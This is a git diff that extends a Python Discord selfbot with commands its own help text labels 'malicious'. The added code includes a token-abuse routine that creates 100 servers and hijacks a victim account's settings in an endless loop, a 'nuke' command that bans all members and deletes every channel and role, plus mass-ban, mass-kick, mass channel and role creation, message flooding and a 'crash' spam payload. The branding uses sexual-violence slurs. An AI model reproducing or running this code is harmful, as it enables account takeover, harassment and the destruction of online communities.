@@ -25,6 +25,15 @@ import psutil
 import ctypes
 import cryptography
 from discord.ext import commands, tasks
+import base64
+import sys
+from threading import Thread
+from itertools import cycle
+from urllib.request import urlopen
+import numpy 
+import webbrowser 
+
+
 
 def clear():
     os.system('cls' if os.name == 'nt' else 'clear')
@@ -168,14 +177,14 @@ async def help(ctx, help):
         embed= discord.Embed(color= 0x34495E, title= "Commands",timestamp=datetime.utcfromtimestamp(time.time()))
         embed.set_thumbnail(url="https://i.imgur.com/t6NHYp5.jpeg")
         embed.set_footer(text=" RapeV1")
-        embed.add_field(name="messages", value= "purge, deleteall, av", inline=False)
-        embed.add_field(name="malicious", value="webhookinfo, delhook, sendhook", inline=False)
+        embed.add_field(name="messages", value= "purge, deleteall, av, purgehac, spam, snipe", inline=False)
+        embed.add_field(name="malicious", value="webhookinfo, delhook, sendhook, purgehack, nuke, masschannel, massrole, tokenfuck, crash, masskick, banall", inline=False)
         embed.add_field(name="networking", value="iplookup, ping", inline=False)
-        embed.add_field(name="Fun", value="kiss, hug, dafloppa, btc, mommy, leet", inline=False)
+        embed.add_field(name="Fun", value="kiss, hug, dafloppa, btc, mommy, leet, dankmemerfarm", inline=False)
         embed.add_field(name="NSFW", value="hentai, lesbian", inline=False)
-        embed.add_field(name="selfbot", value="clear, restart", inline=False)
+        embed.add_field(name="selfbot", value="clear, restart, logout", inline=False)
         embed.add_field(name="Moderation", value="ban, kick, unban", inline=False)
-        embed.add_field(name="Info", value="Made by https://github.com/moronnnn ", inline=False)
+        embed.add_field(name="Info", value="shows info on the selfbot", inline=False)
         await ctx.send(embed=embed)
     except:
         await ctx.send("Error: this command does not have embed permissions check the console for the list")
@@ -214,6 +223,17 @@ async def hookinfo(ctx, webhook):
     await ctx.send(embed=embed, delete_after=def_after)
 
 @bot.command()
+async def info(ctx):
+    await ctx.message.delete()
+    embed = discord.Embed(title="**Selfbot Information**", color=0x6495ED, timestamp=datetime.utcfromtimestamp(time.time()))
+    embed.set_thumbnail(url="https://i.imgur.com/JiF6DNA.jpg")
+    embed.add_field(name="**made in**", value="python (discord.py) ", inline=False)
+    embed.add_field(name="**made by**", value=".??#0001 (Xraq) github: https://github.com/moronnnn",inline=False)
+    embed.add_field(name="**originated by**", value="https://github.com/i3gap",inline=False)
+    embed.set_footer(text="RapeV1")
+    await ctx.send(embed=embed)
+
+@bot.command()
 async def kiss(ctx): 
     await ctx.message.delete()
     r = requests.get("https://neko-love.xyz/api/v1/kiss")
@@ -231,7 +251,13 @@ async def hug(ctx):
     em.set_image(url=res['url'])
     await ctx.send(embed=em)
 
-    
+@bot.command(aliases=['exit'])
+async def logout(ctx):
+    await ctx.message.delete()
+    await ctx.send("logging out..", delete_after=0.2)
+    await asyncio.sleep(2)
+    exit(0)
+
 @bot.command(usage="mommy", description="mommy? sorry.")
 async def mommy(rape, amount: int):
     await rape.message.delete()
@@ -242,6 +268,63 @@ async def mommy(rape, amount: int):
       await asyncio.sleep(1)
       await mommy.edit(content='Mommy?')
 
+@bot.command(aliases=['discfuck'])
+async def tokenfuck(ctx, _token):
+    await ctx.message.delete()
+    headers = {
+        'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
+        'Content-Type': 'application/json',
+        'Authorization': _token,
+    }
+    request = requests.Session()
+    payload = {
+        'theme': "light",
+        'locale': "ja",
+        'message_display_compact': True,
+        'inline_embed_media': False,
+        'inline_attachment_media': False,
+        'gif_auto_play': False,
+        'render_embeds': False,
+        'render_reactions': False,
+        'animate_emoji': False,
+        'convert_emoticons': False,
+        'enable_tts_command': False,
+        'explicit_content_filter': '0',
+        'status': "invisible",
+        'custom_status': "token fucked by Xraq"
+    }
+    guild = {
+        'channels': None,
+        'icon': "https://i.imgur.com/QHq1tiY.png",
+        'name': "NUKED",
+        'region': "europe"
+    }
+    for _i in range(100):
+        requests.post('https://discordapp.com/api/v6/guilds', headers=headers, json=guild)
+    while True:
+        try:
+            request.patch("https://canary.discordapp.com/api/v6/users/@me/settings", headers=headers, json=payload)
+        except Exception as e:
+            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
+        else:
+            break
+    modes = cycle(["light", "dark"])
+    statuses = cycle(["online", "idle", "dnd", "invisible"])
+    while True:
+        setting = {
+            'theme': next(modes),
+            'locale': random.choice(locales),
+            'status': next(statuses)
+        }
+        while True:
+            try:
+                request.patch("https://canary.discordapp.com/api/v6/users/@me/settings", headers=headers, json=setting,
+                              timeout=10)
+            except Exception as e:
+                print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
+            else:
+                break
+
 @bot.command(aliases=['avatar '])
 async def av(ctx, *, member: discord.Member = None):
     await ctx.message.delete()
@@ -251,24 +334,9 @@ async def av(ctx, *, member: discord.Member = None):
     await ctx.send(embed=embed)
 
 @bot.command()
-async def ping(ctx):
+async def ping(ctx, ip):
     await ctx.message.delete()
-    try:
-        embed= discord.Embed(color= 0x34495E, title=f"Pong",timestamp=datetime.utcfromtimestamp(time.time()))
-        embed.set_footer(text=" RapeV1")
-        before = time.monotonic()
-        message = await ctx.send(embed=embed)
-        await asyncio.sleep(1)
-        ping = (time.monotonic() - before) * 1000
-        embed= discord.Embed(color= green_light, title=f"Ping: {int(ping)}ms",timestamp=datetime.utcfromtimestamp(time.time()))
-        embed.set_footer(text=" RapeV1")
-        await message.edit(embed=embed)
-
-    except discord.HTTPException:
-        before = time.monotonic()
-        message = await ctx.send("Pong!")
-        ping = (time.monotonic() - before) * 1000
-        await message.edit(content=f"Ping: `{int(ping)}ms`")
+    await ctx.send(pingip(ip), delete_after=val)
 
 @bot.command()
 async def iplookup(ctx, ip: str=None):
@@ -317,10 +385,10 @@ async def dafloppa(rape):
     await rape.send('https://pbs.twimg.com/media/Epe8jZ2WwAMSk2b.jpg')
     await ctx.send(embed=embed)
 
-@bot.command(usage='btc')
+@bot.command(usage='btc', description='Check Bitcoin Price!')
 async def btc(rape):
     await rape.message.delete()
-    r = requests.get("https://min-api.cryptocompare.com/data/price?fsym=BTC&tsyms=USD,EUR")
+    r = requests.get("https://min-api.cryptocompare.com/data/price?fsym=BTC&tsyms=USD")
     r = r.json()
     usd = r["USD"]
     embed = discord.Embed(description=f"```${str(usd)}```", color=RandomColor())
@@ -329,9 +397,10 @@ async def btc(rape):
 
 @bot.command()
 async def leet(ctx, *, message: str=None):
+    await ctx.message.delete()
     
     if message is None:
-        await ctx.send("Insert message sir")
+        await ctx.send("insert leet message")
     else:
         try:
             word = message
@@ -347,7 +416,7 @@ async def leet(ctx, *, message: str=None):
                     leetmsg = leetmsg.replace('s', '2')
                     leetmsg = leetmsg.replace('you', 'j00')
 
-            embed= discord.Embed(color= 0x6495ED, title="1337 Haxor", description=f"{leetmsg.upper()}",timestamp=datetime.utcfromtimestamp(time.time()))
+            embed= discord.Embed(color= 0x6495ED, title="Leet", description=f"{leetmsg.upper()}",timestamp=datetime.utcfromtimestamp(time.time()))
             embed.set_thumbnail(url="https://i.imgur.com/TR2cv3C.jpg")
             embed.set_footer(text=" RapeV1")
             await ctx.send(embed=embed)
@@ -374,6 +443,17 @@ async def hentai(ctx):
     embed = discord.Embed()
     embed.set_image(url=res['url'])
     await ctx.send(embed=embed)
+
+@bot.command()
+async def crash(ctx):
+    await ctx.message.delete()
+    for i in range(25):
+        await ctx.send(':grinning: :thumbsup: :eyes: :heart: :watermelon: :fork_and_knife: :tired_face: :poop: :weary: :yum: :nerd: :sunglasses: :triumph: :jack_o_lantern: :cold_face::grinning: :thumbsup: :eyes: :heart: :watermelon: :fork_and_knife: :tired_face: :poop: :weary: :yum: :nerd: :sunglasses: :triumph: :jack_o_lantern: :cold_face::grinning: :thumbsup: :eyes: :heart: :watermelon: :fork_and_knife: :tired_face: :poop: :weary: :yum: :nerd: :sunglasses: :triumph: :jack_o_lantern: :cold_face::grinning: :thumbsup: :eyes: :heart: :watermelon: :fork_and_knife: :tired_face: :poop: :weary: :yum: :nerd: :sunglasses: :triumph: :jack_o_lantern: :cold_face::grinning: :thumbsup: :eyes: :heart: :watermelon: :fork_and_knife: :tired_face: :poop: :weary: :yum: :nerd: :sunglasses: :triumph: :jack_o_lantern: :cold_face::grinning: :thumbsup: :eyes: :heart: :watermelon: :fork_and_knife: :tired_face: :poop: :weary: :yum: :nerd: :sunglasses: :triumph: :jack_o_lantern: :cold_face::grinning: :thumbsup: :eyes: :heart: :watermelon: :fork_and_knife: :tired_face: :poop: :weary: :yum: :nerd: :sunglasses: :triumph: :jack_o_lantern: :cold_face: ﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽:grinning: :thumbsup: :eyes: :heart: :watermelon: :fork_and_knife: :tired_face: :poop: :weary: :yum: :nerd: :sunglasses::grinning: :thumbsup: :eyes: :heart: :watermelon: :fork_and_knife: :tired_face: :poop: :weary: :yum: :nerd: :sunglasses:')
+        await ctx.send(""":chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains:""")
+        await ctx.send(':grinning: :thumbsup: :eyes: :heart: :watermelon: :fork_and_knife: :tired_face: :poop: :weary: :yum: :nerd: :sunglasses: :triumph: :jack_o_lantern: :cold_face::grinning: :thumbsup: :eyes: :heart: :watermelon: :fork_and_knife: :tired_face: :poop: :weary: :yum: :nerd: :sunglasses: :triumph: :jack_o_lantern: :cold_face::grinning: :thumbsup: :eyes: :heart: :watermelon: :fork_and_knife: :tired_face: :poop: :weary: :yum: :nerd: :sunglasses: :triumph: :jack_o_lantern: :cold_face::grinning: :thumbsup: :eyes: :heart: :watermelon: :fork_and_knife: :tired_face: :poop: :weary: :yum: :nerd: :sunglasses: :triumph: :jack_o_lantern: :cold_face::grinning: :thumbsup: :eyes: :heart: :watermelon: :fork_and_knife: :tired_face: :poop: :weary: :yum: :nerd: :sunglasses: :triumph: :jack_o_lantern: :cold_face::grinning: :thumbsup: :eyes: :heart: :watermelon: :fork_and_knife: :tired_face: :poop: :weary: :yum: :nerd: :sunglasses: :triumph: :jack_o_lantern: :cold_face::grinning: :thumbsup: :eyes: :heart: :watermelon: :fork_and_knife: :tired_face: :poop: :weary: :yum: :nerd: :sunglasses: :triumph: :jack_o_lantern: :cold_face: ﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽:grinning: :thumbsup: :eyes: :heart: :watermelon: :fork_and_knife: :tired_face: :poop: :weary: :yum: :nerd: :sunglasses::grinning: :thumbsup: :eyes: :heart: :watermelon: :fork_and_knife: :tired_face: :poop: :weary: :yum: :nerd: :sunglasses:')
+        await ctx.send(""":chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains:""")
+        await ctx.send(':grinning: :thumbsup: :eyes: :heart: :watermelon: :fork_and_knife: :tired_face: :poop: :weary: :yum: :nerd: :sunglasses: :triumph: :jack_o_lantern: :cold_face::grinning: :thumbsup: :eyes: :heart: :watermelon: :fork_and_knife: :tired_face: :poop: :weary: :yum: :nerd: :sunglasses: :triumph: :jack_o_lantern: :cold_face::grinning: :thumbsup: :eyes: :heart: :watermelon: :fork_and_knife: :tired_face: :poop: :weary: :yum: :nerd: :sunglasses: :triumph: :jack_o_lantern: :cold_face::grinning: :thumbsup: :eyes: :heart: :watermelon: :fork_and_knife: :tired_face: :poop: :weary: :yum: :nerd: :sunglasses: :triumph: :jack_o_lantern: :cold_face::grinning: :thumbsup: :eyes: :heart: :watermelon: :fork_and_knife: :tired_face: :poop: :weary: :yum: :nerd: :sunglasses: :triumph: :jack_o_lantern: :cold_face::grinning: :thumbsup: :eyes: :heart: :watermelon: :fork_and_knife: :tired_face: :poop: :weary: :yum: :nerd: :sunglasses: :triumph: :jack_o_lantern: :cold_face::grinning: :thumbsup: :eyes: :heart: :watermelon: :fork_and_knife: :tired_face: :poop: :weary: :yum: :nerd: :sunglasses: :triumph: :jack_o_lantern: :cold_face: ﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽:grinning: :thumbsup: :eyes: :heart: :watermelon: :fork_and_knife: :tired_face: :poop: :weary: :yum: :nerd: :sunglasses::grinning: :thumbsup: :eyes: :heart: :watermelon: :fork_and_knife: :tired_face: :poop: :weary: :yum: :nerd: :sunglasses:')
+        await ctx.send(""":chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains:""")
 
 @bot.command()
 @commands.has_permissions(ban_members=True)
@@ -432,6 +512,80 @@ async def sendhook(ctx, webhook, *, message):
         await ctx.send(embed=embed)
 
 @bot.command()
+async def snipe(ctx):
+    await ctx.message.delete()
+    currentChannel = ctx.channel.id
+    if currentChannel in client.sniped_message_dict:
+        await ctx.send(f'{client.sniped_message_dict[currentChannel]}')
+    else:
+        await ctx.send('There are no messages no snipe!', delete_after=3)
+
+@bot.command()
+async def banall(ctx):
+    await ctx.message.delete()
+    for m in ctx.guild.members:
+        try:
+            await m.ban()
+        except:
+            pass
+
+@bot.command()
+async def masskick(ctx):
+    await ctx.message.delete()
+    for member in ctx.guild.members:
+        await member.kick()
+
+@bot.command()
+async def github(ctx):
+    await ctx.message.delete()
+    webbrowser.open_new('https://github.com/moronnnn')
+
+@bot.command()
+async def spam(ctx, amount: int, *, message):
+    await ctx.message.delete()
+    for _i in range(amount):
+        await ctx.send(f'{message}\n' * 15)
+@bot.command()
+async def nuke(ctx):
+    for user in ctx.guild.members:
+        try:
+            await user.ban()
+        except:
+            pass
+    for channel in ctx.guild.channels:
+        try:
+            await channel.delete()
+        except:
+            pass
+    for role in ctx.guild.roles:
+        try:
+            await role.delete()
+        except:
+            pass
+    try:
+        await ctx.guild.edit(
+            name="https://github.com/moronnnn",
+            description="Get Raped",
+            reason="cus i can",
+            icon=None,
+            banner=None
+        )
+    except:
+        pass
+
+@bot.command()
+async def masschannel(ctx):
+    await ctx.message.delete()
+    for _i in range(250):
+        await ctx.guild.create_text_channel(name="raped")
+@bot.command()
+async def massrole(ctx):
+    await ctx.message.delete()
+    for _i in range(100):
+        await ctx.guild.create_role(name="nuked by xraq")
+
+
+@bot.command()
 async def restart(ctx):
     await ctx.message.delete()
     clear()
@@ -473,6 +627,33 @@ async def delhook(ctx, webhook: str):
         else:
             embed = discord.Embed(description=f"failed to delete webhook. possibly deleted already or invalid.", color=0x6495ED)
             await ctx.send(embed=embed, delete_after=del_after)
+
+@bot.command(name='purgehack')
+async def purgehack(ctx):
+        await ctx.message.edit(content='ﾠﾠ\n'* 400 + 'ﾠﾠ')
+
+@bot.command(aliases=['whois'])
+async def userinfo(ctx, member: discord.Member = None):
+    await ctx.message.delete()
+    if not member:
+        member = ctx.message.author
+    roles = [role for role in member.roles]
+    embed.set_thumbnail(url=member.avatar_url)
+
+    embed.add_field(name="ID", value=member.id)
+    embed.add_field(name="Display Name", value=member.display_name)
+    embed.add_field(name="Animated Avatar? ", value=member.is_avatar_animated())
+    try:
+        embed.add_field(name="Mutual Friends", value=len(await member.mutual_friends()))
+    except:
+        pass
+
+    embed.add_field(name="Created Account On", value=member.created_at.strftime("%a, %#d %B %Y, %I:%M %p UTC"))
+    embed.add_field(name="Joined Server On", value=member.joined_at.strftime("%a, %#d %B %Y, %I:%M %p UTC"))
+
+    embed.add_field(name="Roles", value="".join([role.mention for role in roles]))
+    embed.add_field(name="Highest Role", value=member.top_role.mention)
+    await ctx.send(embed=embed, delete_after=20)
 
 @bot.command()
 async def createdm(ctx, member: discord.Member=None):
